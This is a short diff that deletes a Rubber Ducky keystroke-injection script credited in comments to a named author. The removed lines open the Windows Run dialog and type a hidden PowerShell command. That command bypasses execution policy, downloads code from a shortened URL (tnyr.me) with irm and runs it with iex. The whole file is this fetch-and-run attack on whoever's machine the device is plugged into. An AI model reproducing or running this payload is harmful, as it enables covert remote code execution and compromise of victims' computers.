@@ -1,6 +1,0 @@
-REM By Joshua O' Brien
-REM uses pester to run an executable
-REM uses pester_bat.ps1, ( you probbably have to state the full filepath there )
-GUI r
-DEFAULT_DELAY 350
-STRING powershell -NoP -Ep Bypass -W H -C irm  tnyr.me/ySiiEoMLAJ | iex
